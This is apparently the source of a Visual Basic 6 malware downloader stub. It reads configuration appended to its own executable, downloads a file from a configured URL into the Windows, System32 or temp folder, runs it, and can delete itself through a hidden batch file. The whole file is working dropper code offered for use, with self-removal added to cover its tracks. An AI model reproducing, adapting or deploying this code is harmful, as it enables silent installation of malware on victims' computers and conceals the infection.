Attribute VB_Name = "Module1"
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long


Const DATA_ARRAY = "[split]"
Const DATA_START = "[start]"


Dim DATA_SPLIT() As String
Dim DATA_PARAMS() As String
Dim GRAB_DATA As String


Private Sub Main()

Dim URL As String
Dim Path As String

Open App.Path + "\" + App.EXEName + ".exe" For Binary As #1

GRAB_DATA = String(LOF(1), vbNullChar)

Get #1, , GRAB_DATA

Close #1

DATA_SPLIT() = Split(GRAB_DATA, DATA_START)
         
DATA_PARAMS = Split(DATA_SPLIT(1), DATA_ARRAY)

Select Case DATA_PARAMS(2)
    Case "win"
        Path = Environ("windir") & "\" & DATA_PARAMS(1)
    Case "sys":
        Path = Environ("windir") & "\" & "system32" & "\" & DATA_PARAMS(1)
    Case "tmp":
        Path = Environ("tmp") & "\" & DATA_PARAMS(1)
    Case "C:\"
        Path = "C:\" & DATA_PARAMS(1)
    End Select
    
URL = URLDownloadToFile(0, DATA_PARAMS(0), Path, 0, 0)

Shell Path, vbNormalFocus

If DATA_PARAMS(3) = "Melt" Then

Call Melt

End If

End

End Sub

Private Function Melt() 'by affix :)
Open Environ("temp") & "\" & "temp.bat" For Output As #2 ' Create our File in Temp dir
    Print #2, "@echo off"  ' Use this to make sure the Bat File doesnt echo
    Print #2, "sleep 500"  ' Pause for 500ms
    Print #2, "del " & App.EXEName + ".exe" 'Delete our EXE
    Print #2, "del a.bat" 'Finally Delet the Batch File
    Print #2, "cls" 'CLEAR COMMAND
    Print #2, "exit" 'Exit the Command Window
Close #2 ' Close the open file
Shell Environ("temp") & "\" & "temp.bat", vbHide 'Run the Batch File as Hidden
End Function
